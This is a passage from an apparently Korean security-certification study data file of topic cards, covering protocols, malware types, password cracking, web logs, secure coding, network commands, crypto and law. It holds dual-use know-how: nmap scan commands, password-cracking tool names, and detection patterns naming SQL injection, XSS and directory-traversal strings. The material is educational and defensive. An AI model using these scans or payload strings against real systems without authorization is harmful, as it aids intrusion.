    category: 'app',
    subcategory: '이메일',
    title: '이메일 보안',
    content: `
**이메일 구성요소:**

| 구성요소 | 설명 | 예시 |
|----------|------|------|
| **MUA** | 사용자 메일 클라이언트 | Outlook, Thunderbird |
| **MTA** | 메일 서버 간 전송 | Sendmail, Postfix |
| **MDA** | 사용자 메일함에 저장 | Dovecot |

**이메일 프로토콜:**

| 프로토콜 | 포트 | 용도 |
|----------|------|------|
| SMTP | 25, 587 | 메일 전송 |
| POP3 | 110 | 메일 수신 (다운로드) |
| IMAP | 143 | 메일 수신 (동기화) |

**이메일 보안 기술:**

| 기술 | 특징 |
|------|------|
| **PEM** | 이메일 암호화 표준, 복잡 |
| **S/MIME** | X.509 인증서 기반, 가장 널리 사용 |
| **PGP** | 공개키 기반, 분산 신뢰 모델 |

**스팸/피싱 방지:**

| 기술 | 설명 |
|------|------|
| **SPF** | 발신 서버 IP 검증 |
| **DKIM** | 메일 서명 검증 |
| **DMARC** | SPF + DKIM 정책 |

**키링 (PGP):**
- 공개키와 개인키를 저장/관리하는 데이터베이스
    `,
    keyPoints: ['MUA=클라이언트', 'MTA=서버간 전송', 'S/MIME=X.509 기반', 'SPF/DKIM=발신자 검증'],
    isWeakness: false,
  },

  // ==================== 악성코드 ====================
  {
    id: 'malware-types',
    category: 'system',
    subcategory: '악성코드',
    title: '악성코드 유형',
    content: `
**악성코드 분류:**

| 유형 | 특징 |
|------|------|
| **바이러스** | 숙주 프로그램 필요, 자가 복제 |
| **웜** | 독립 실행, 네트워크 전파 |
| **트로이목마** | 정상 프로그램 위장 |
| **랜섬웨어** | 파일 암호화 후 금전 요구 |
| **스파이웨어** | 정보 수집 및 전송 |
| **애드웨어** | 광고 표시 |
| **루트킷** | 시스템 은닉, 권한 유지 |
| **백도어** | 비인가 접근 통로 |

**랜섬웨어 종류:**
- WannaCry
- Locky
- CryptoLocker
- TeslaCrypt
- NotPetya

**백도어 도구:**
- Back Orifice: 윈도우 원격 제어
- Netcat: 네트워크 백도어

**APT (Advanced Persistent Threat):**
\`\`\`
지능적(Advanced) + 지속적(Persistent) + 표적형(Threat)
- 스피어 피싱: 특정 대상 맞춤형 피싱
- 워터링 홀: 자주 방문하는 사이트 침해
- 드라이브 바이 다운로드: 방문만으로 감염
\`\`\`

**대응:**
- 백신 소프트웨어
- 패치 관리
- 네트워크 모니터링
- 사용자 보안 인식 교육
    `,
    keyPoints: ['바이러스=숙주 필요', '웜=네트워크 전파', 'APT=표적형 공격', '스피어 피싱=맞춤형'],
    isWeakness: true,
  },

  // ==================== 패스워드 크래킹 ====================
  {
    id: 'password-cracking',
    category: 'system',
    subcategory: '공격',
    title: '패스워드 크래킹',
    content: `
**크래킹 기법:**

| 기법 | 방식 | 특징 |
|------|------|------|
| **사전 공격** | 사전 파일의 단어 대입 | 빠름 |
| **무차별 공격** | 모든 조합 시도 | 느림, 확실 |
| **혼합 공격** | 사전 + 무작위 조합 | 균형 |
| **레인보우 테이블** | 사전 계산된 해시값 비교 | 빠름 |

**레인보우 테이블:**
- 해시값-평문 매핑 테이블
- 대용량 저장 공간 필요
- Salt로 방어 가능

**크래킹 도구:**

| 도구 | 대상 |
|------|------|
| John the Ripper | 다양한 해시 |
| pwdump | 윈도우 해시 덤프 |
| L0phtCrack | 윈도우 패스워드 |
| Hashcat | GPU 기반 크래킹 |
| Hydra | 온라인 크래킹 |

**대응:**
- 복잡한 패스워드 정책
- Salt 사용
- 계정 잠금 정책
- 다단계 인증 (MFA)
- 패스워드 해싱 (bcrypt, Argon2)

**패스워드 정책:**
\`\`\`
- 최소 8자 이상
- 대소문자 + 숫자 + 특수문자
- 최대 90일 사용
- 최근 12개 재사용 금지
\`\`\`
    `,
    keyPoints: ['사전 공격=사전 파일', '레인보우 테이블=Salt로 방어', 'bcrypt/Argon2 사용', 'MFA 적용'],
    isWeakness: true,
  },

  // ==================== 프로토콜 보안 ====================
  {
    id: 'snmp-security',
    category: 'network',
    subcategory: '프로토콜',
    title: 'SNMP 보안',
    content: `
**SNMP 개요:**
- 네트워크 장비 모니터링/관리 프로토콜
- Manager (162/udp) ↔ Agent (161/udp)

**SNMP 버전 비교:**

| 버전 | 인증 | 암호화 | 특징 |
|------|------|--------|------|
| **v1** | Community String | X | 평문 전송, 취약 |
| **v2c** | Community String | X | 기능 향상, 보안 취약 |
| **v3** | 사용자 인증 | O (DES/AES) | USM, VACM 지원 |

**데이터 수집 방식:**

| 방식 | 설명 |
|------|------|
| **Polling** | Manager가 Agent에 요청 (161/udp) |
| **Event Reporting** | Agent가 Manager에 Trap 전송 (162/udp) |

**SNMP 데이터 모델:**

| 구성 | 설명 |
|------|------|
| **MIB** | 관리 객체 집합 (트리 구조) |
| **OID** | 객체 식별자 |
| **SMI** | MIB 구조/포맷 정의 규격 |
| **ASN.1** | 데이터 속성 정의 언어 |

**보안 설정:**
- Community String: public/private → 복잡한 문자열 변경
- RW 모드 사용 자제 (RO 권장)
- SNMPv3 사용 권장
    `,
    keyPoints: ['v1/v2c=Community String만', 'v3=암호화+인증', 'MIB=객체 집합', 'OID=객체 식별자'],
    isWeakness: true,
  },

  {
    id: 'ftp-security',
    category: 'network',
    subcategory: '프로토콜',
    title: 'FTP 보안',
    content: `
**FTP 모드 비교:**

| 모드 | 제어 채널 | 데이터 채널 | 특징 |
|------|-----------|-------------|------|
| **Active** | Client→Server:21 | Server:20→Client | 클라이언트 방화벽 문제 |
| **Passive** | Client→Server:21 | Client→Server:1024+ | 서버 방화벽 설정 필요 |

**Active 모드:**
\`\`\`
1. Client → Server:21 (제어 채널, PORT 명령)
2. Server:20 → Client:지정포트 (데이터 채널)
문제: 클라이언트 방화벽이 인바운드 차단
\`\`\`

**Passive 모드:**
\`\`\`
1. Client → Server:21 (제어 채널, PASV 명령)
2. Client → Server:1024+ (데이터 채널)
문제: 서버 1024+ 포트 인바운드 허용 필요
\`\`\`

**FTP 공격:**

| 공격 | 설명 | 대응 |
|------|------|------|
| **Bounce Attack** | 임의 목적지로 데이터 전송 | 20번 포트 외 거부 |
| **TFTP Attack** | 인증 없이 파일 접근 | -s 옵션 (Secure Mode) |
| **Anonymous FTP** | 익명 접속 | anonymous_enable=NO |

**접근 제어 파일:**

| 파일 | 설명 |
|------|------|
| **/etc/ftpusers** | FTP 접속 거부 계정 |
| **/etc/vsftpd/user_list** | 접속 제한 계정 (userlist_enable=YES) |
    `,
    keyPoints: ['Active=서버가 연결', 'Passive=클라이언트가 연결', 'ftpusers=접속 거부', 'TFTP=-s 옵션'],
    isWeakness: true,
  },

  {
    id: 'http-cookie-session',
    category: 'app',
    subcategory: '웹',
    title: 'HTTP 쿠키/세션 보안',
    content: `
**쿠키 vs 세션:**

| 구분 | 쿠키 | 세션 |
|------|------|------|
| 저장 위치 | 클라이언트 | 서버 |
| 보안성 | 낮음 (노출 위험) | 높음 |
| 만료 | Expires 설정 | 서버 설정 |
| 용도 | 상태 정보 유지 | 인증 상태 유지 |

**쿠키 종류:**

| 종류 | 저장 | 소멸 |
|------|------|------|
| **영속 쿠키** | 파일 | Expires 만료 |
| **세션 쿠키** | 메모리 | 브라우저 종료 |

**쿠키 보안 속성:**

| 속성 | 설명 | 방어 |
|------|------|------|
| **HttpOnly** | JavaScript 접근 차단 | XSS 공격 |
| **Secure** | HTTPS에서만 전송 | 스니핑 |
| **SameSite** | 동일 사이트만 전송 | CSRF 공격 |
| **Expires** | 유효기간 설정 | 노출 최소화 |

**세션 공격 대응:**

| 공격 | 대응 |
|------|------|
| 세션 하이재킹 | 세션 ID 재생성 (로그인 시) |
| 세션 고정 | 인증 후 세션 ID 변경 |
| 세션 예측 | 강력한 난수 생성기 |
    `,
    keyPoints: ['HttpOnly=XSS 방어', 'Secure=HTTPS만', 'SameSite=CSRF 방어', '세션 ID 재생성'],
    isWeakness: true,
  },

  {
    id: 'http-methods',
    category: 'app',
    subcategory: '웹',
    title: 'HTTP 메소드 및 상태코드',
    content: `
**HTTP 메소드:**

| 메소드 | 용도 | 보안 |
|--------|------|------|
| **GET** | 리소스 조회 | 파라미터 URL 노출 |
| **POST** | 리소스 생성 | Body에 데이터 |
| **PUT** | 리소스 전체 수정 | 비활성화 권장 |
| **PATCH** | 리소스 일부 수정 | 비활성화 권장 |
| **DELETE** | 리소스 삭제 | 비활성화 권장 |
| **OPTIONS** | 허용 메소드 확인 | 정보 노출 |
| **TRACE** | 요청 경로 추적 | XST 공격, 비활성화 |

**HTTP 상태 코드:**

| 코드 | 분류 | 의미 |
|------|------|------|
| **1xx** | 정보 | 처리 중 |
| **2xx** | 성공 | 200 OK |
| **3xx** | 리다이렉션 | 301/302 이동 |
| **4xx** | 클라이언트 오류 | 400 Bad, 401 인증, 403 권한, 404 없음 |
| **5xx** | 서버 오류 | 500 내부 오류 |

**보안 설정:**
\`\`\`apache
# Apache - 불필요한 메소드 비활성화
<Directory />
  <LimitExcept GET POST>
    Require all denied
  </LimitExcept>
</Directory>

# TRACE 메소드 비활성화
TraceEnable Off
\`\`\`
    `,
    keyPoints: ['GET/POST만 허용', 'TRACE=XST 공격', '4xx=클라이언트 오류', '5xx=서버 오류'],
    isWeakness: false,
  },

  {
    id: 'apache-security',
    category: 'app',
    subcategory: '웹서버',
    title: 'Apache 웹서버 보안',
    content: `
**주요 설정 파일:**
- /etc/httpd/conf/httpd.conf (CentOS)
- /etc/apache2/apache2.conf (Ubuntu)

**보안 설정:**

| 설정 | 권장값 | 설명 |
|------|--------|------|
| **ServerTokens** | Prod | 버전 정보 최소화 |
| **ServerSignature** | Off | 에러 페이지 서명 제거 |
| **TraceEnable** | Off | TRACE 메소드 비활성화 |
| **Options -Indexes** | 설정 | 디렉터리 리스팅 차단 |
| **Options -FollowSymLinks** | 설정 | 심볼릭 링크 차단 |

**접근 제어:**
\`\`\`apache
<Directory "/var/www/html">
  Options -Indexes -FollowSymLinks
  AllowOverride None
  Require all granted
</Directory>

# IP 기반 접근 제어
<Directory "/admin">
  Require ip 192.168.1.0/24
</Directory>
\`\`\`

**로그 설정:**
\`\`\`apache
# 로그 포맷
LogFormat "%h %l %u %t \\"%r\\" %>s %b" common
LogFormat "%h %l %u %t \\"%r\\" %>s %b \\"%{Referer}i\\" \\"%{User-Agent}i\\"" combined

# 로그 파일
CustomLog logs/access_log combined
ErrorLog logs/error_log
\`\`\`
    `,
    keyPoints: ['ServerTokens Prod', 'Options -Indexes', 'TraceEnable Off', 'combined 로그'],
    isWeakness: true,
  },

  {
    id: 'log-analysis',
    category: 'app',
    subcategory: '로그분석',
    title: '웹 로그 분석',
    content: `
**Apache 로그 형식 (Combined):**
\`\`\`
192.168.1.1 - - [17/Feb/2026:10:00:00 +0900] "GET /index.html HTTP/1.1" 200 1234 "http://example.com" "Mozilla/5.0"
   │        │ │      │                            │                       │    │       │                  │
  IP       ID 사용자   시간                         요청                    상태 크기    Referer            User-Agent
\`\`\`

**공격 탐지 패턴:**

| 공격 | 로그 패턴 |
|------|-----------|
| **SQL Injection** | ' OR, UNION SELECT, --, %27 |
| **XSS** | <script>, alert(, onerror= |
| **Directory Traversal** | ../, %2e%2e%2f |
| **웹쉘 업로드** | .php, .jsp, .asp 업로드 |
| **스캐닝** | 404 다량 발생, 민감 경로 접근 |

**분석 명령어:**
\`\`\`bash
# 접속 IP Top 10
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head

# 404 오류 확인
grep '" 404 ' access.log | wc -l

# SQL Injection 시도
grep -iE "union|select|insert|delete|update|drop" access.log

# 특정 IP 로그
grep "^192.168.1.1" access.log
\`\`\`

**IIS 로그:**
- 위치: %SystemDrive%\\inetpub\\logs\\LogFiles
- W3C 확장 로그 형식 사용
    `,
    keyPoints: ['Combined=IP+요청+상태+Referer+UA', 'SQL Injection=union,select', '404 다량=스캐닝', 'grep으로 분석'],
    isWeakness: true,
  },

  {
    id: 'pki-certificate',
    category: 'crypto',
    subcategory: 'PKI',
    title: 'PKI 및 인증서',
    content: `
**PKI 구성요소:**

| 구성요소 | 역할 |
|----------|------|
| **CA** | 인증기관, 인증서 발급/폐기 |
| **RA** | 등록기관, 신원 확인 |
| **CRL** | 인증서 폐기 목록 |
| **OCSP** | 실시간 인증서 상태 확인 |
| **Repository** | 인증서/CRL 저장소 |

**X.509 인증서 구조:**

| 필드 | 설명 |
|------|------|
| Version | 버전 (v3) |
| Serial Number | 일련번호 |
| Signature Algorithm | 서명 알고리즘 |
| Issuer | 발급자 (CA) |
| Validity | 유효기간 (Not Before/After) |
| Subject | 소유자 |
| Public Key | 공개키 |
| Extensions | 확장 필드 (v3) |
| Signature | CA 서명 |

**인증서 검증:**
\`\`\`
1. 인증서 유효기간 확인
2. 인증서 서명 검증 (CA 공개키로)
3. CRL/OCSP로 폐기 여부 확인
4. 인증서 체인 검증 (Root CA까지)
\`\`\`

**전자서명법:**
- 공인인증서 → 공동인증서 (2020년 폐지)
- 전자서명 = 부인방지 + 무결성 + 인증
    `,
    keyPoints: ['CA=인증기관', 'CRL=폐기목록', 'OCSP=실시간 확인', 'X.509=인증서 표준'],
    isWeakness: true,
  },

  {
    id: 'forensic-process',
    category: 'law',
    subcategory: '포렌식',
    title: '디지털 포렌식 절차',
    content: `
**포렌식 5대 원칙:**

| 원칙 | 설명 |
|------|------|
| **정당성** | 적법한 절차로 수집 |
| **재현** | 동일 조건에서 동일 결과 |
| **신속성** | 휘발성 증거 우선 수집 |
| **연계 보관성** | Chain of Custody |
| **무결성** | 증거 변조 방지 (해시값) |

**포렌식 절차:**
\`\`\`
1. 사전 준비 → 2. 증거 수집 → 3. 증거 포장/이송
→ 4. 조사/분석 → 5. 보고서 작성
\`\`\`

**증거 수집 순서 (휘발성):**

| 순서 | 대상 | 휘발성 |
|------|------|--------|
| 1 | 레지스터, 캐시 | 최고 |
| 2 | 메모리 (RAM) | 높음 |
| 3 | 네트워크 상태 | 높음 |
| 4 | 프로세스 정보 | 높음 |
| 5 | 디스크 | 낮음 |
| 6 | 백업 매체 | 최저 |

**증거 무결성:**
\`\`\`bash
# 해시값 생성 (MD5, SHA-256)
md5sum evidence.dd > evidence.md5
sha256sum evidence.dd > evidence.sha256

# 디스크 이미징
dd if=/dev/sda of=evidence.dd bs=4096
\`\`\`

**분석 도구:**
- EnCase, FTK, Autopsy
- Volatility (메모리 분석)
    `,
    keyPoints: ['연계 보관성=Chain of Custody', '휘발성 순서=메모리 먼저', '무결성=해시값', 'dd=이미징'],
    isWeakness: true,
  },

  {
    id: 'privacy-protection',
    category: 'law',
    subcategory: '개인정보',
    title: '개인정보 보호',
    content: `
**개인정보 정의:**
- 살아있는 개인을 식별할 수 있는 정보
- 다른 정보와 결합하여 식별 가능한 정보 포함

**개인정보 처리 단계:**

| 단계 | 보호조치 |
|------|----------|
| **수집** | 동의, 목적 명시, 최소 수집 |
| **이용** | 목적 내 이용, 제3자 제공 동의 |
| **보관** | 암호화, 접근통제, 보관기간 |
| **파기** | 복구 불가능한 방법 |

**암호화 기준:**

| 대상 | 암호화 |
|------|--------|
| 고유식별정보 | 필수 (주민번호, 여권 등) |
| 비밀번호 | 일방향 암호화 (해시) |
| 바이오정보 | 필수 |
| 전송 구간 | SSL/TLS |

**접근통제:**
\`\`\`
- 개인정보처리시스템 접근 권한 최소화
- 접근 권한 부여/변경/말소 기록 3년 보관
- 비밀번호 복잡도 및 변경주기 설정
- 외부에서 접속 시 VPN 또는 전용선
\`\`\`

**주요 위반 과태료:**

| 위반 내용 | 과태료 |
|----------|--------|
| 동의 없이 수집 | 5천만원 이하 |
| 암호화 미적용 | 3천만원 이하 |
| 파기 미이행 | 3천만원 이하 |
    `,
    keyPoints: ['최소 수집 원칙', '고유식별정보=암호화 필수', '비밀번호=일방향 암호화', '접근 권한 기록 3년'],
    isWeakness: true,
  },

  {
    id: 'cloud-security',
    category: 'security',
    subcategory: '클라우드',
    title: '클라우드 보안',
    content: `
**클라우드 서비스 모델:**

| 모델 | 제공 | 사용자 관리 |
|------|------|------------|
| **IaaS** | 인프라 (VM, 스토리지) | OS, 앱, 데이터 |
| **PaaS** | 플랫폼 (런타임, DB) | 앱, 데이터 |
| **SaaS** | 애플리케이션 | 데이터만 |

**클라우드 배포 모델:**

| 모델 | 설명 |
|------|------|
| **Public** | 공용, 다중 테넌트 |
| **Private** | 전용, 단일 조직 |
| **Hybrid** | Public + Private |
| **Community** | 특정 그룹 공유 |

**클라우드 보안 위협:**

| 위협 | 설명 |
|------|------|
| 데이터 유출 | 다중 테넌트 환경 |
| 불충분한 접근통제 | 권한 관리 |
| 안전하지 않은 API | 인터페이스 취약점 |
| 계정 탈취 | 자격증명 도용 |

**클라우드 보안 솔루션:**

| 솔루션 | 설명 |
|--------|------|
| **CASB** | 클라우드 접근 보안 브로커 |
| **CWPP** | 클라우드 워크로드 보호 |
| **CSPM** | 클라우드 보안 설정 관리 |

**CSA (Cloud Security Alliance):**
- CCM (Cloud Controls Matrix)
- CAIQ (Consensus Assessments Initiative Questionnaire)
    `,
    keyPoints: ['IaaS=인프라', 'SaaS=앱 제공', 'CASB=접근 브로커', 'CSA=클라우드 보안 표준'],
    isWeakness: false,
  },

  {
    id: 'secure-coding',
    category: 'app',
    subcategory: '시큐어코딩',
    title: '시큐어 코딩',
    content: `
**시큐어 코딩 7대 원칙:**

| 원칙 | 설명 |
|------|------|
| **입력 데이터 검증** | 모든 입력값 검증 |
| **보안 기능** | 인증, 암호화 적용 |
| **시간 및 상태** | 레이스 컨디션 방지 |
| **에러 처리** | 민감 정보 노출 방지 |
| **코드 품질** | 널 포인터, 자원 해제 |
| **캡슐화** | 정보 은닉 |
| **API 오용** | 안전한 함수 사용 |

**입력값 검증:**
\`\`\`java
// Bad
String query = "SELECT * FROM users WHERE id='" + id + "'";

// Good (PreparedStatement)
PreparedStatement ps = conn.prepareStatement(
  "SELECT * FROM users WHERE id = ?");
ps.setString(1, id);
\`\`\`

**취약 함수 대체:**

| 취약 함수 | 안전 함수 |
|----------|----------|
| strcpy | strncpy, strlcpy |
| sprintf | snprintf |
| gets | fgets |
| scanf | fgets + sscanf |

**에러 처리:**
\`\`\`java
// Bad
catch (Exception e) {
  e.printStackTrace();  // 스택 정보 노출
}

// Good
catch (Exception e) {
  logger.error("Error occurred", e);
  response.sendError(500, "Internal Error");
}
\`\`\`
    `,
    keyPoints: ['PreparedStatement 사용', 'strncpy 사용', '에러 메시지 최소화', '입력값 검증 필수'],
    isWeakness: true,
  },

  {
    id: 'network-commands',
    category: 'network',
    subcategory: '명령어',
    title: '네트워크 분석 명령어',
    content: `
**netstat:**
\`\`\`bash
netstat -an        # 모든 연결 (숫자로)
netstat -ant       # TCP 연결
netstat -anu       # UDP 연결
netstat -anp       # PID 포함
netstat -rn        # 라우팅 테이블
\`\`\`

**상태값:**

| 상태 | 설명 |
|------|------|
| LISTEN | 대기 중 |
| ESTABLISHED | 연결됨 |
| TIME_WAIT | 종료 대기 |
| CLOSE_WAIT | 원격 종료 대기 |
| SYN_SENT | SYN 전송 |
| SYN_RECV | SYN 수신 |

**tcpdump:**
\`\`\`bash
tcpdump -i eth0              # 인터페이스 지정
tcpdump host 192.168.1.1     # 특정 호스트
tcpdump port 80              # 특정 포트
tcpdump -w capture.pcap      # 파일 저장
tcpdump -r capture.pcap      # 파일 읽기
tcpdump -n                   # 이름 해석 안함
\`\`\`

**nmap:**
\`\`\`bash
nmap -sT 192.168.1.1         # TCP Connect 스캔
nmap -sS 192.168.1.1         # SYN 스캔 (스텔스)
nmap -sU 192.168.1.1         # UDP 스캔
nmap -sV 192.168.1.1         # 버전 탐지
nmap -O 192.168.1.1          # OS 탐지
nmap -p 1-1000 192.168.1.1   # 포트 범위
\`\`\`

**기타:**
\`\`\`bash
ping -c 4 192.168.1.1        # ICMP 연결 확인
traceroute 192.168.1.1       # 경로 추적
arp -a                       # ARP 테이블
\`\`\`
    `,
    keyPoints: ['netstat -anp=연결+PID', 'tcpdump -w=저장', 'nmap -sS=스텔스', 'TIME_WAIT=종료 대기'],
    isWeakness: true,
  },

  {
    id: 'linux-firewall',
    category: 'linux',
    subcategory: '방화벽',
    title: 'iptables / firewalld',
    content: `
**iptables 체인:**

| 체인 | 설명 |
|------|------|
| **INPUT** | 들어오는 패킷 |
| **OUTPUT** | 나가는 패킷 |
| **FORWARD** | 경유 패킷 |

**iptables 기본:**
\`\`\`bash
# 규칙 조회
iptables -L -n -v

# 규칙 추가 (INPUT)
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -j DROP

# 규칙 삭제
iptables -D INPUT 1

# 모든 규칙 삭제
iptables -F
\`\`\`

**타겟:**

| 타겟 | 동작 |
|------|------|
| ACCEPT | 허용 |
| DROP | 폐기 (응답 없음) |
| REJECT | 거부 (ICMP 응답) |
| LOG | 로그 기록 |

**firewalld (CentOS 7+):**
\`\`\`bash
# 상태 확인
firewall-cmd --state

# 서비스 허용
firewall-cmd --add-service=http --permanent
firewall-cmd --add-port=8080/tcp --permanent

# 규칙 적용
firewall-cmd --reload

# Zone 확인
firewall-cmd --get-active-zones
\`\`\`

**Zone:**
- public, trusted, dmz, internal, external 등
    `,
    keyPoints: ['INPUT=인바운드', 'FORWARD=경유', 'DROP=응답없이 폐기', 'firewall-cmd --permanent'],
    isWeakness: true,
  },

  {
    id: 'vulnerability-scan',
    category: 'security',
    subcategory: '취약점',
    title: '취약점 점검 도구',
    content: `
**취약점 스캐너:**

| 도구 | 대상 | 특징 |
|------|------|------|
| **Nessus** | 네트워크/시스템 | 상용, 가장 널리 사용 |
| **OpenVAS** | 네트워크/시스템 | 오픈소스 |
| **Nikto** | 웹서버 | 오픈소스, 빠른 스캔 |
| **OWASP ZAP** | 웹 애플리케이션 | 오픈소스 |
| **Burp Suite** | 웹 애플리케이션 | 프록시 기반 |
| **SQLMap** | SQL Injection | 자동화 도구 |

**스캔 유형:**

| 유형 | 설명 |
|------|------|
| **인증 스캔** | 자격증명으로 로그인 후 스캔 |
| **비인증 스캔** | 외부에서 스캔 |
| **에이전트 기반** | 호스트에 에이전트 설치 |

**취약점 분류 (CVSS 3.0):**

| 등급 | 점수 |
|------|------|
| Critical | 9.0 - 10.0 |
| High | 7.0 - 8.9 |
| Medium | 4.0 - 6.9 |
| Low | 0.1 - 3.9 |

**OWASP Top 10 (2021):**
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Auth Failures
8. Software/Data Integrity Failures
9. Logging/Monitoring Failures
10. SSRF
    `,
    keyPoints: ['Nessus=네트워크', 'OWASP ZAP=웹앱', 'SQLMap=SQL Injection', 'CVSS=취약점 등급'],
    isWeakness: true,
  },

  {
    id: 'encryption-algorithm',
    category: 'crypto',
    subcategory: '알고리즘',
    title: '암호화 알고리즘 상세',
    content: `
**대칭키 알고리즘:**

| 알고리즘 | 블록 | 키 길이 | 라운드 | 특징 |
|----------|------|---------|--------|------|
| **DES** | 64bit | 56bit | 16 | 취약, 사용 금지 |
| **3DES** | 64bit | 168bit | 48 | 느림 |
| **AES** | 128bit | 128/192/256 | 10/12/14 | 현재 표준 |
| **SEED** | 128bit | 128bit | 16 | 국산 |
| **ARIA** | 128bit | 128/192/256 | 12/14/16 | 국산 |
| **LEA** | 128bit | 128/192/256 | 24/28/32 | 국산, 경량 |

**해시 알고리즘:**

| 알고리즘 | 해시 길이 | 상태 |
|----------|-----------|------|
| MD5 | 128bit | 취약, 사용 금지 |
| SHA-1 | 160bit | 취약 |
| SHA-256 | 256bit | 권장 |
| SHA-3 | 가변 | 최신 |

**키 교환:**

| 방식 | 설명 |
|------|------|
| **DH** | 이산 로그, 중간자 공격 취약 |
| **ECDH** | 타원곡선 DH |
| **RSA** | 공개키로 대칭키 암호화 |

**패스워드 해싱:**

| 알고리즘 | 특징 |
|----------|------|
| bcrypt | Blowfish 기반, Salt+Cost |
| scrypt | 메모리 집약적 |
| Argon2 | 최신, 메모리+시간 조절 |
| PBKDF2 | 반복 해싱 |
    `,
    keyPoints: ['AES=현재 표준', 'DES=사용 금지', 'SHA-256 권장', 'bcrypt/Argon2=패스워드'],
    isWeakness: true,
  },

  {
    id: 'windows-event-log',
    category: 'windows',
    subcategory: '로그',
    title: '윈도우 이벤트 로그',
    content: `
**로그 종류:**

| 로그 | 내용 |
|------|------|
| **Application** | 응용프로그램 이벤트 |
| **Security** | 감사 이벤트 (로그온, 권한) |
| **System** | 시스템 구성요소 이벤트 |
| **Setup** | 설치 관련 이벤트 |

**주요 Security 이벤트 ID:**

| ID | 내용 |
|----|------|
| **4624** | 로그온 성공 |
| **4625** | 로그온 실패 |
| **4634** | 로그오프 |
| **4648** | 명시적 자격증명 로그온 |
| **4672** | 특권 할당 |
| **4720** | 계정 생성 |
| **4726** | 계정 삭제 |
| **4732** | 그룹에 멤버 추가 |

**로그온 유형:**

| 유형 | 설명 |
|------|------|
| 2 | 대화형 (콘솔) |
| 3 | 네트워크 |
| 4 | 배치 |
| 5 | 서비스 |
| 7 | 잠금 해제 |
| 10 | 원격 대화형 (RDP) |

**감사 정책:**
\`\`\`
secpol.msc → 로컬 정책 → 감사 정책
- 계정 로그온 이벤트 감사
- 로그온 이벤트 감사
- 개체 액세스 감사
- 권한 사용 감사
\`\`\`

**로그 위치:**
%SystemRoot%\\System32\\winevt\\Logs
    `,
    keyPoints: ['4624=로그온 성공', '4625=로그온 실패', '유형 3=네트워크', '유형 10=RDP'],
    isWeakness: true,
  },

  {
    id: 'backup-recovery',
    category: 'law',
    subcategory: '백업',
    title: '백업 및 복구',
    content: `
**백업 유형:**

| 유형 | 백업 대상 | 시간 | 복구 시간 |
|------|----------|------|----------|
| **전체 백업** | 모든 데이터 | 오래 걸림 | 빠름 |
| **증분 백업** | 마지막 백업 이후 변경분 | 빠름 | 오래 걸림 |
| **차등 백업** | 전체 백업 이후 변경분 | 중간 | 중간 |

**백업 예시 (일~토):**
\`\`\`
전체 백업 (일요일)

증분 백업:
월: 일~월 변경분
화: 월~화 변경분
...
복구: 일(전체) + 월 + 화 + 수 + 목 + 금 필요

차등 백업:
월: 일~월 변경분
화: 일~화 변경분 (누적)
...
복구: 일(전체) + 금(차등) 만 필요
\`\`\`

**3-2-1 백업 규칙:**
- 3개 이상의 백업 복사본
- 2개 이상의 다른 미디어
- 1개는 오프사이트 보관

**RAID:**

| RAID | 디스크 | 특징 |
|------|--------|------|
| **RAID 0** | 2+ | 스트라이핑, 장애 복구 X |
| **RAID 1** | 2+ | 미러링, 50% 용량 |
| **RAID 5** | 3+ | 패리티 분산, 1개 장애 허용 |
| **RAID 6** | 4+ | 이중 패리티, 2개 장애 허용 |
| **RAID 10** | 4+ | 1+0, 미러링+스트라이핑 |
    `,
    keyPoints: ['증분=마지막 이후', '차등=전체 이후', '3-2-1 규칙', 'RAID 5=1개 장애 허용'],
    isWeakness: false,
  },

  {
    id: 'network-attack-detail',
    category: 'network',
    subcategory: '공격',
    title: '네트워크 공격 상세',
    content: `
**스니핑 공격:**

| 공격 | 설명 | 대응 |
|------|------|------|
| Passive Sniffing | 허브 환경 도청 | 스위치 사용 |
| Active Sniffing | 스위치 환경 공격 | 암호화 |
| Switch Jamming | MAC 테이블 가득 채움 | Port Security |
| SPAN Port | 미러링 포트 악용 | 접근 통제 |

**IP Spoofing:**
\`\`\`
1. 공격자가 출발지 IP를 신뢰 호스트로 위조
2. 서버는 위조된 IP로 응답
3. 공격자는 Sequence Number 예측
대응: ingress/egress filtering
\`\`\`

**ICMP 공격:**

| 공격 | 설명 |
|------|------|
| **Smurf** | ICMP Echo를 브로드캐스트로 위조 |
| **Ping of Death** | 비정상 크기 ICMP 패킷 |
| **ICMP Redirect** | 라우팅 테이블 조작 |

**스캐닝 기법:**

| 기법 | 패킷 | 응답 (열림) | 응답 (닫힘) |
|------|------|------------|------------|
| TCP Connect | SYN | SYN+ACK → ACK | RST |
| SYN Scan | SYN | SYN+ACK | RST |
| FIN Scan | FIN | 응답 없음 | RST |
| XMAS | FIN+URG+PSH | 응답 없음 | RST |
| NULL | 플래그 없음 | 응답 없음 | RST |

**대응:**
- IDS/IPS 모니터링
- 방화벽 규칙 설정
- 암호화 통신 (VPN, TLS)
    `,
    keyPoints: ['Switch Jamming=MAC 테이블 공격', 'Smurf=브로드캐스트 증폭', 'SYN Scan=스텔스', 'XMAS=FIN+URG+PSH'],
    isWeakness: true,
  },

  // ==================== 법규 세부 ====================
  {
    id: 'info-comm-law',
    category: 'law',
    subcategory: '법규',
    title: '정보통신망법 주요 내용',
    content: `
**정보통신망 이용촉진 및 정보보호 등에 관한 법률:**

**주요 의무:**

| 항목 | 내용 |
|------|------|
| 개인정보 수집·이용 | 동의 필수, 목적 명시 |
| 개인정보 제3자 제공 | 별도 동의 필수 |
| 개인정보 파기 | 목적 달성 시 지체없이 파기 |
| 기술적·관리적 보호조치 | 의무 |
| 개인정보 유출 통지 | 24시간 이내 |

**주요 위반 과태료:**

| 위반 | 과태료 |
|------|--------|
| 동의 없이 수집 | 3천만원 이하 |
| 기술적 보호조치 미흡 | 3천만원 이하 |
| 유출 미통지 | 3천만원 이하 |
| 동의 없이 제3자 제공 | 3천만원 이하 |

**정보통신서비스 제공자 의무:**
- 개인정보 처리방침 공개
- 개인정보보호 책임자 지정
- 내부관리계획 수립
- 접근통제 및 접근권한 관리
- 암호화 (전송, 저장)
- 접속기록 보관 (최소 1년)
- 물리적 보안

**침해사고 대응:**
- 유출 인지 시 24시간 이내 통지
- KISA 신고 의무
    `,
    keyPoints: ['동의 필수', '유출 통지 24시간', '접속기록 1년', 'KISA 신고'],
    isWeakness: true,
  },

  {
    id: 'electronic-signature-law',
    category: 'law',
    subcategory: '법규',
